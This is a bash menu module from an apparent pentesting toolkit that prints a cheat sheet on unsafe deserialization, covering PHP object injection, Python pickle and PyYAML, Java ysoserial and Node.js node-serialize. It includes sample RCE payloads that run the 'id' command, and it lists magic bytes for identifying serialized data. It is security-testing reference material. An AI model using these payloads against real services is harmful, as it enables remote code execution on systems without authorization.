#!/bin/bash
# HackTricks Ref: deserialization
# Module: Unsafe Deserialization (PHP, Python, Java, Node.js)

echo -e "${C6}[WEB ATTACK: SERVER_DESERIALIZATION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/deserialization"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Target Environment:${NC}"
echo "1) PHP Object Injection (__wakeup, __destruct)"
echo "2) Python Pickle / YAML (unsafe load)"
echo "3) Java Deserialization (ysoserial context)"
echo "4) Node.js (node-serialize / untrusted-data)"
echo "5) Identification (Magic Bytes / Signatures)"
echo "0) Exit"

read -p "Selection: " des_opt

case $des_opt in
    1)
        echo -e "\n${C2}[*] PHP Object Injection:${NC}"
        echo "Look for serialized strings: O:4:\"User\":2:{s:8:\"username\";s:3:\"bob\";...}"
        echo "Exploit 'Magic Methods': __wakeup(), __destruct(), __toString()"
        echo -e "${C4}Tool:${NC} phpggc (PHP Generic Gadget Chains)"
        ;;
    2)
        echo -e "\n${C2}[*] Python (Pickle/PyYAML):${NC}"
        echo "Pickle payload example (RCE):"
        echo " ccopy_reg\nconstructor\n(cos\nsystem\n(S'id'\ntRtR."
        echo "PyYAML unsafe load: !!python/object/apply:os.system ['id']"
        ;;
    3)
        echo -e "\n${C2}[*] Java Deserialization:${NC}"
        echo "Commonly found in ViewState, RMI, or JMX."
        echo "Look for 'rO0AB' (Base64 of AC ED 00 05 - Java Magic Bytes)."
        echo -e "${C4}Tool:${NC} ysoserial (Generates payloads for CommonsCollections, Groovy, etc.)"
        ;;
    4)
        echo -e "\n${C2}[*] Node.js Deserialization:${NC}"
        echo "Vulnerable to IIFE (Immediately Invoked Function Expression) injection:"
        echo " {\"rce\":\"_$$\$ND_FUNC\$\$_function(){require('child_process').exec('id')}()\"}"
        ;;
    5)
        echo -e "\n${C2}[*] Identification Cheat Sheet:${NC}"
        echo " - Java: AC ED 00 05 (Hex) | rO0AB (B64)"
        echo " - .NET: <ResourceDictionary ... (XMLSerializer)"
        echo " - Python: 80 03 (Pickle v3/4)"
        echo " - PHP: O: (Object), a: (Array), s: (String)"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
